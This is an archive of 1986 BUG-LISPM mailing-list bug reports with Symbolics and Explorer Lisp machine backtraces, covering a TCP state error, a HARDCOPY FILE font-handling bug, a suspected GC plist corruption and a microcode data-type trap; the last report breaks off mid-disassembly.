>>Error: TCP implementation error: TCB #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115> in bad state while receiving a FIN.
         TCP has been disabled.
While in the function TCP::TCP-IMPLEMENTATION-ERROR  TCP::ADD-SEG-TO-END-OF-INPUT-QUEUE  TCP::ADD-SEG-TO-INPUT-QUEUE

TCP::TCP-IMPLEMENTATION-ERROR:  (P.C. = 20)
   Arg 0 (TCP::FATAL): NIL
   Arg 1 (TCP::FORMAT-STRING): "TCB ~S in bad state while receiving a FIN."
   Rest arg (TCP::FORMAT-ARGS): (#<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>)

TCP::ADD-SEG-TO-END-OF-INPUT-QUEUE:  (P.C. = 116)
   Arg 0 (TCP::TCB): #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>
   Arg 1 (TCP::SEG): #<TCP Segment 105506113>
   Arg 2 (TCP::SEG.LIM): 1588288343
   Arg 3 (TCP::FIN): T

TCP::ADD-SEG-TO-INPUT-QUEUE:  (P.C. = 175)
   Arg 0 (TCP::TCB): #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>
   Arg 1 (TCP::SEG): #<TCP Segment 105506113>
   Arg 2 (TCP::SEG.SEQ): 1588288342
   Arg 3 (TCP::SEG.LIM): 1588288343
   Arg 4 (TCP::SEG.URG): NIL
   Arg 5 (TCP::FIN): T

(:METHOD TCP::TCP-PROTOCOL :RECEIVE-TCP-SEGMENT):  (P.C. = 767)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:OPERATION): :RECEIVE-TCP-SEGMENT
   Arg 3 (TCP::SEG): #<TCP Segment 105506113>

(:METHOD TCP::TCP-PROTOCOL :RECEIVE-IP-PACKET):  (P.C. = 164)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:OPERATION): :RECEIVE-IP-PACKET
   Arg 3 (TCP::SEG): #<TCP Segment 105506113>
   Arg 4 (TCP::TOTAL-LENGTH): 20
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030

(:METHOD TCP::TCP-PROTOCOL :COMBINED :RECEIVE-IP-PACKET):  (P.C. = 17)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:.OPERATION.): :RECEIVE-IP-PACKET
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<TCP Segment 105506113> 20 167772238 303694030)

(:DEFUN-METHOD TCP::IP-RECEIVE-RAW):  (P.C. = 43)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::FREE-FLAG): T

(:DEFUN-METHOD TCP::IP-RECEIVE):  (P.C. = 35)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::FREE-FLAG): T

(:DEFUN-METHOD TCP::IP-RETRANSMIT-PACKET):  (P.C. = 132)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::ROUTE): NIL
   Local 7 (TCP::ROUTE): #<IP-ROUTE ZERMATT (18.26.0.206) via LOCAL>
   Arg 8 (TCP::SOURCE-INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 9 (TCP::FREE-FLAG): T

(:METHOD TCP::IP-PROTOCOL :RECEIVE-PACKET):  (P.C. = 211)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (SI:OPERATION): :RECEIVE-PACKET
   Arg 3 (TCP::PKT): #<ART-8B-1942 105505751>
   Arg 4 (TCP::SOURCE-INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 5 (IGNORE): 303694030

(:METHOD TCP:INTERNET-NETWORK :RECEIVE-PACKET):  (P.C. = 11)
   Arg 0 (SELF): #<INTERNET-NETWORK INTERNET 43312323>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP:INTERNET-NETWORK -- 1. IV's, 0. FL's 13134701>
   Arg 2 (SI:OPERATION): :RECEIVE-PACKET
   Arg 3 (TCP::PKT): #<ART-8B-1942 105505751>
   Arg 4 (TCP::INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 5 (TCP::ADDRESS): 303694030

(:METHOD NETI:ADDRESS-RESOLUTION-INTERFACE-MIXIN :RECEIVE-PROTOCOL-PACKET):  (P.C. = 31)<<Error printing function name>>
   Arg 0 (SELF): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:ADDRESS-RESOLUTION-INTERFACE-MIXIN -- 4. IV's, 0. FL's 120212026>
   Arg 2 (SI:OPERATION): :RECEIVE-PROTOCOL-PACKET
   Arg 3 (NETI:PROTOCOL-PACKET): #<ART-8B-1942 105505751>
   Arg 4 (NETI:PROTOCOL): 2048

(:METHOD NETI:3600-ETHERNET-INTERFACE :TOP-LEVEL):  (P.C. = 171)<<Error printing function name>>
   Arg 0 (SELF): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:3600-ETHERNET-INTERFACE -- 6. IV's, 2. FL's 120212364>
   Arg 2 (SI:OPERATION): :TOP-LEVEL

SI:PROCESS-SCHEDULER:  (P.C. = 345)<<Error printing function name>>
14-Mar-86 18:19:36-EST,5916;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Mar 86 18:19-EST
Date: Fri, 14 Mar 86 18:18 EST
From: RZ@MIT-ZERMATT.ARPA
Sender: File-Server@MIT-ZERMATT.ARPA
Subject: Network problems
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860314181852.1.FILE-SERVER@MIT-ZERMATT.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Mailer 43.6,
6-1-Patches 1.11, MLSite 12.2, Imagen Spooler 5.4,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Network-Security patch, Server-Finger patch,
File system updater, on Zermatt:

This happened on Zermatt, our fileserver/namespace server.


>>Error: TCP implementation error: TCB #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115> in bad state while receiving a FIN.
         TCP has been disabled.
While in the function TCP::TCP-IMPLEMENTATION-ERROR  TCP::ADD-SEG-TO-END-OF-INPUT-QUEUE  TCP::ADD-SEG-TO-INPUT-QUEUE

TCP::TCP-IMPLEMENTATION-ERROR:  (P.C. = 20)
   Arg 0 (TCP::FATAL): NIL
   Arg 1 (TCP::FORMAT-STRING): "TCB ~S in bad state while receiving a FIN."
   Rest arg (TCP::FORMAT-ARGS): (#<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>)

TCP::ADD-SEG-TO-END-OF-INPUT-QUEUE:  (P.C. = 116)
   Arg 0 (TCP::TCB): #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>
   Arg 1 (TCP::SEG): #<TCP Segment 105506113>
   Arg 2 (TCP::SEG.LIM): 1588288343
   Arg 3 (TCP::FIN): T

TCP::ADD-SEG-TO-INPUT-QUEUE:  (P.C. = 175)
   Arg 0 (TCP::TCB): #<TCP connection to UCB-ARPA 25 (:SMTP), local port 12487 105431115>
   Arg 1 (TCP::SEG): #<TCP Segment 105506113>
   Arg 2 (TCP::SEG.SEQ): 1588288342
   Arg 3 (TCP::SEG.LIM): 1588288343
   Arg 4 (TCP::SEG.URG): NIL
   Arg 5 (TCP::FIN): T

(:METHOD TCP::TCP-PROTOCOL :RECEIVE-TCP-SEGMENT):  (P.C. = 767)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:OPERATION): :RECEIVE-TCP-SEGMENT
   Arg 3 (TCP::SEG): #<TCP Segment 105506113>

(:METHOD TCP::TCP-PROTOCOL :RECEIVE-IP-PACKET):  (P.C. = 164)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:OPERATION): :RECEIVE-IP-PACKET
   Arg 3 (TCP::SEG): #<TCP Segment 105506113>
   Arg 4 (TCP::TOTAL-LENGTH): 20
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030

(:METHOD TCP::TCP-PROTOCOL :COMBINED :RECEIVE-IP-PACKET):  (P.C. = 17)
   Arg 0 (SELF): #<TCP-PROTOCOL 23367534>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-PROTOCOL -- 3. IV's, 1. FL's 1121366>
   Arg 2 (SI:.OPERATION.): :RECEIVE-IP-PACKET
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<TCP Segment 105506113> 20 167772238 303694030)

(:DEFUN-METHOD TCP::IP-RECEIVE-RAW):  (P.C. = 43)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::FREE-FLAG): T

(:DEFUN-METHOD TCP::IP-RECEIVE):  (P.C. = 35)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::FREE-FLAG): T

(:DEFUN-METHOD TCP::IP-RETRANSMIT-PACKET):  (P.C. = 132)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (TCP::IP): #<IP-HEADER 105506150>
   Arg 3 (TCP::HEADER-LENGTH): 20
   Arg 4 (TCP::TOTAL-LENGTH): 40
   Arg 5 (TCP::SOURCE): 167772238
   Arg 6 (TCP::DESTINATION): 303694030
   Arg 7 (TCP::ROUTE): NIL
   Local 7 (TCP::ROUTE): #<IP-ROUTE ZERMATT (18.26.0.206) via LOCAL>
   Arg 8 (TCP::SOURCE-INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 9 (TCP::FREE-FLAG): T

(:METHOD TCP::IP-PROTOCOL :RECEIVE-PACKET):  (P.C. = 211)
   Arg 0 (SELF): #<IP-PROTOCOL 14030127>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::IP-PROTOCOL -- 19. IV's, 0. FL's 1203704>
   Arg 2 (SI:OPERATION): :RECEIVE-PACKET
   Arg 3 (TCP::PKT): #<ART-8B-1942 105505751>
   Arg 4 (TCP::SOURCE-INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 5 (IGNORE): 303694030

(:METHOD TCP:INTERNET-NETWORK :RECEIVE-PACKET):  (P.C. = 11)
   Arg 0 (SELF): #<INTERNET-NETWORK INTERNET 43312323>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP:INTERNET-NETWORK -- 1. IV's, 0. FL's 13134701>
   Arg 2 (SI:OPERATION): :RECEIVE-PACKET
   Arg 3 (TCP::PKT): #<ART-8B-1942 105505751>
   Arg 4 (TCP::INTERFACE): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 5 (TCP::ADDRESS): 303694030

(:METHOD NETI:ADDRESS-RESOLUTION-INTERFACE-MIXIN :RECEIVE-PROTOCOL-PACKET):  (P.C. = 31)<<Error printing function name>>
   Arg 0 (SELF): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:ADDRESS-RESOLUTION-INTERFACE-MIXIN -- 4. IV's, 0. FL's 120212026>
   Arg 2 (SI:OPERATION): :RECEIVE-PROTOCOL-PACKET
   Arg 3 (NETI:PROTOCOL-PACKET): #<ART-8B-1942 105505751>
   Arg 4 (NETI:PROTOCOL): 2048

(:METHOD NETI:3600-ETHERNET-INTERFACE :TOP-LEVEL):  (P.C. = 171)<<Error printing function name>>
   Arg 0 (SELF): #<3600-ETHERNET-INTERFACE 105412557>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:3600-ETHERNET-INTERFACE -- 6. IV's, 2. FL's 120212364>
   Arg 2 (SI:OPERATION): :TOP-LEVEL

SI:PROCESS-SCHEDULER:  (P.C. = 345)<<Error printing function name>>
14-Mar-86 21:56:10-EST,4038;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Mar 86 21:56-EST
Received: from FLUTE.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 27562; Fri 14-Mar-86 21:55:55-EST
Date: Fri, 14 Mar 86 21:55 EST
From: Steve Seda <Seda@MIT-ZERMATT.ARPA>
Subject: CP command HARDCOPY FILE chokes when a font is a list
To: BUG-LISPM@MIT-ZERMATT.ARPA
cc: seda@MIT-ZERMATT.ARPA
Message-ID: <860314215518.9.SEDA@FLUTE.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.11, MLSite 13.0,
Experimental DVI 1.1, Experimental Schema 109.0, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-info.flod(2),
FEP0:>v127-debug.flod(1), on Flute:

----------------------------------------------------------------------------------------------
The CP command HARDCOPY FILE loses when it send a printer a :default-font message and gets a
list of font information.  The code assumes that a string is returned and tries to decode it
and create the list.

This code is the (define-cp-command com-hardcopy-file ...) form in
>sys>r6>cp>file-commands.lisp.

Here is the part causing the problem.  The (unless (listp font) ... form checks for the list
case, but the (send printer :default-font) form may set font to be a list in the body of the
unless form.

  (setq fonts
	(loop for font in fonts
	      do (unless (listp font)
		   (when (eq font :default-font)
		     (setq font (send printer :default-font)))
		   (when font
		     (cond
		       ((stringp font) (setq font (string-upcase font)))
		       ((typep font 'font) (setq font (font-name font))))
		     (multiple-value-bind (name face size)
			 (press:decode-font-name font)
		       (setq font (list name face size)))))
	      collect font))
----------------------------------------------------------------------------------------------

>>Error: Cannot coerce ("LPT" "" 10) into a string
While in the function STRING  STRING-REVERSE-SEARCH-SET  PRESS:DECODE-FONT-NAME

STRING:  (P.C. = 113)
   Arg 0 (SI:X): ("LPT" "" 10)
   Local 1 (SI:STR): "Cannot coerce ~S into a string"

STRING-REVERSE-SEARCH-SET:  (P.C. = 21)
   Arg 0 (SI:CHAR-SET): (48 49 50 51 52 53 54 55 56 57)
   Arg 1 (STRING): ("LPT" "" 10)
   --Defaulted args:--
   Arg 2 (SI:FROM): NIL
   Arg 3 (SI:TO): 0

PRESS:DECODE-FONT-NAME:  (P.C. = 7)
   Arg 0 (STRING): ("LPT" "" 10)

(:PROPERTY SI:COM-HARDCOPY-FILE SI:CP-FUNCTION):  (P.C. = 275)  (from SYS: HARDCOPY; HARDCOPY-46-28)
   Arg 0 (SI:FILE): (#<LMFS-PATHNAME "Z:>seda>p.press">)
   Arg 1 (SI:BANNER-MESSAGE): NIL
   Arg 2 (SI:COPIES): 1
   Arg 3 (DELETE): NIL
   Arg 4 (SI:FILE-TYPES): :PRESS
   Arg 5 (SI:FONTS): (:DEFAULT-FONT)
   Arg 6 (FORMAT): :PORTRAIT
   Arg 7 (SI:PRINTER): #<PRESS-PRINTER TREMONT-VIA-MC 43306340>
   Arg 8 (SI:QUERY): :NO
   Arg 9 (SI:RUNNING-HEAD): :NUMBERED

SI:COM-HARDCOPY-FILE:  (P.C. = 60)  (from SYS: HARDCOPY; HARDCOPY-46-28)
   Arg 0 (SI:FILE): (#<LMFS-PATHNAME "Z:>seda>p.press">)
   Rest arg: (:PRINTER #<PRESS-PRINTER TREMONT-VIA-MC 43306340> :FILE-TYPES :PRESS)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:COM-HARDCOPY-FILE (QUOTE (#<LMFS-PATHNAME "Z:>seda>p.press">)) :PRINTER #<PRESS-PRINTER TREMONT-VIA-MC 43306340> :FILE-TYPES :PRESS)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

Rest of stack:
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:LISP-TOP-LEVEL:  (P.C. = 7)
16-Mar-86 10:58:02-EST,4705;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 16 Mar 86 10:57-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 16 MAR 86  10:56:19 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25941; Sun 16-Mar-86 10:56:44-EST
Date: Sun, 16 Mar 86 10:56 EST
From: JCMA@MIT-AI.ARPA
Subject: Static GC Bug?
To: BUG-LISPM@MIT-REAGAN.ARPA, AI.Duffy@UTEXAS-20.ARPA
Message-ID: <860316105622.8.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.39,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I did (PLIST 'MACSYMA:$POWERSERIES) after Duffy reported that he was unable to
GC his relatus band in texas.  I got the error reported here.  This does not
obtain in regular AI lab IDS worlds (e.g. rb-4).  This world was built by
loading an IDS world (allowing migration from the world load) and then doing
(SI:FULL-GC).  My guess is that the static GC bashed this plist.

>>Trap: The word #<DTP-15 1706423445> was read from location 43007216 (in PROPERTY-LIST-AREA).
While in the function LAST  SI:GRIND-LINEAR-FORM  SI:GRIND-TRY

LAST:  (P.C. = 12)
   Arg 0 (LIST): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Local 1 (SI:L): (<<Error printing value>>
   Local 2 (SI:P): (NIL <<Error printing value>>
SI:GRIND-LINEAR-FORM:  (P.C. = 23)
   Arg 0 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 1 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 2 (SI:CHECK-FOR-MACROS): T

SI:GRIND-TRY:  (P.C. = 66)
   Arg 0 (SI:FORM): #<DTP-COMPILED-FUNCTION SI:GRIND-LINEAR-FORM 14307350>
   Arg 1 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 2 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Rest arg (ARGS): (T)

SI:GRIND-FORM:  (P.C. = 135)
   Arg 0 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 1 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>

SI:GRIND-TRY:  (P.C. = 123)
   Arg 0 (SI:FORM): #<DTP-COMPILED-FUNCTION SI:GRIND-FORM 14310457>
   Arg 1 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 2 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Rest arg (ARGS): NIL

SI:GRIND-OPTI-MISER:  (P.C. = 30)
   Arg 0 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   Arg 1 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>

GRIND-TOP-LEVEL:  (P.C. = 60)
   Arg 0 (EXP): (:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>
   --Defaulted args:--
   Arg 1: NIL
   Arg 2: #:TERMINAL-IO-SYN-STREAM
   Arg 3: NIL
   Arg 4: SI:DISPLACED
   Arg 5 (SI:TERPRI-P): T
   Arg 6: NIL
   Arg 7 (SI:LOC): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>

SI:COMMAND-LOOP-PRINT-FUNCTION:  (P.C. = 17)
   Arg 0 (VALUES): ((:SOURCE-FILE-NAME #<LOGICAL-PATHNAME "MACSYMA: RZ; SERIES"> MACSYMA:SUBC NIL <<Error printing value>>

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 175)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 103240073>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 103240100>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 2 16501172 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 2 16501172 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
17-Mar-86 11:12:20-EST,22891;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 17 Mar 86 11:12-EST
Received: from MIT-CHERRY.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 27693; Mon 17-Mar-86 11:11:10-EST
Date: Mon, 17 Mar 86 11:10 EST
From: soley@MIT-MC.ARPA
To: BUG-LISPM@MIT-ZERMATT.ARPA
cc: culler@MIT-XX.ARPA, greg@MIT-XX.ARPA
Message-ID: <860317111057.2.SOLEY@MIT-CHERRY.ARPA>

In SYSTEM 1.72, Compiler 1.9, File System 1.1,
Universal Command Loop 1.0, Window System 1.5, Input Editor 1.1,
ZMACS 1.2, font editor 1.0, Error Handler 1.0, Suggestions 1.0,
Debug Utilities 1.3, Explorer-Net 1.2, Telnet 1.0, VT100 1.0, ZMail 1.0,
Local-File 1.21, Net-Config 1.5, Explorer Serial & Parallel Ports 1.0,
Printer 1.0, Glossary 1.0, Explorer Streamer Tape 1.11, NVRAM 1.3,
User Profile Utility 1.2, microcode 214, ATIG Rel 1.1 3/7, on ASH:


Insert your description of the circumstances here:

Suspected ucode error.  The compilation of (TYPEP <LOCAL> 'ISD) seems to
fail with this wierd ucode error; I tried (defun foo (x) (typep x 'isd) 3),
which generates the same code as at the trap, but which doesn't cause
this error.  This error comes up only sporadically.

At the VERY LEAST, make a better error message.

>>TRAP 1089 (DATA-TYPE-SCREWUP ARRAY)
A bad data-type was found in the internal guts of an ARRAY.
Backtrace from the debugger:

NEW-PROCESS-INCOMING-MESSAGE (P.C. = 562)

 Local 0 (OP-CODE): 11206145
 Local 1 (DEST-PE): 1
 Local 2 (DESC-INDEX): 301
 Local 3 (I-STRUCTURE): #<I-Structure 21 (1) for GENERAL>
 Local 4 (INDEX): 14
 Local 5 (CONTROL): 55
 Local 6 (CONTEXT): 284
 Local 7 (ITERATION): 1
 Local 8 (DESTINATION): 428
 Local 9 (BINARY?): T
 Local 10 (DEST-ARG): 0
 Local 11 (RESPOND-TO-PE): 0
 Local 12 (SERIAL-IN): 1343361
 Local 13 (SERIAL-IN-SHOULD-BE): 1343361
 Local 14: #<ISD: PE: 1 Descriptor: 547>
 Local 15 (.TOKEN.): NIL
 Local 16 (.COPY.): NIL
 Local 17 (DATA-TYPE): NIL
 Local 18 (.NEW.): NIL
 Local 19 (ISD-PE): NIL
 Local 20 (ISD-DESC): NIL
 Local 21 (ISD): NIL
 Local 22 (DATUM): NIL
 Local 23 (SOURCE-PE): NIL
 Local 24 (.EQTOKEN.): NIL
 Local 25 (TAIL): NIL
 Local 26 (POBJ): NIL
 Local 27 (.ISREQ.): NIL
 Local 28 (DECREMENT): NIL
 Local 29 (INCREMENT): NIL
 Local 30 (ARGS-ISD-PE): NIL
 Local 31 (ARGS-ISD-DESC): NIL
 Local 32 (RES-ISD-PE): NIL
 Local 33 (RES-ISD-DESC): NIL
 Local 34 (ARGS-ISD): NIL
 Local 35 (RES-ISD): NIL
 Local 36 (PARENT-PE): NIL
 Local 37 (PARENT-CONTEXT-INDEX): NIL
 Local 38 (.MGRREQ.): NIL
 Local 39 (CONTEXT-INDEX): NIL
 Local 40 (NUMBER-OF-PES): NIL
 Local 41 (MASTER-PE): NIL
 Local 42 (SLAVE-PE): NIL
 Local 43 (PORT): NIL
 Local 44 (SOURCE): NIL
 Local 45 (SENDING-PE): NIL
 Local 46 (DEST): NIL
 Local 47 (STATUS): NIL

------------------------------------------------------------

Disassembled code for NEW-PROCESS-INCOMING-MESSAGE:

262 PUSH-NUMBER 241
263 MOVE D-PDL FEF|35         ;'196608
264 (MISC) %NUBUS-READ D-PDL
